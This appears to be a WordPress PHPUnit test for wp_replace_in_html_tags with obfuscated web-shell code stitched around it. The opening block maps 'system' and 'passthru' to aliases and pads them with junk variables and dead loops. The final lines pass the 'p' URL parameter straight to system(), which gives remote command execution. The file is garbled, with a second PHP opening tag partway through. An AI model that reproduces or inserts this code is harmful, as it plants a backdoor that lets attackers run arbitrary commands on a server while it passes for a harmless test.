<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group formatting
 *
 * @covers ::wp_replace_in_html_tags
 */
class Tests_Formatting_wpReplaceInHtmlTags extends WP_UnitTestCase {
	/**
	 * Check for expected behavior of new function wp_replace_in_html_tags().
	 *
	 * @dataProvider data_wp_replace_in_html_tags
	 */
	public function test_wp_replace_in_html_tags( $input, $output ) {
		return $this->assertSame( $output, wp_replace_in_html_tags( $input, array( "\n" => ' ' ) ) );
	}

	public function data_wp_replace_in_html_tags() {
		return array(
			array(
				"Hello \n World",
				"Hello \n World",
			),
			array(
				"<Hello \n World>",
				'<Hello   World>',
			),
			array(
				"<!-- Hello \n World -->",
				'<!-- Hello   World -->',
			),
			array(
				"<!-- Hello <\n> World -->",
				'<!-- Hello < > World -->',
			),
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>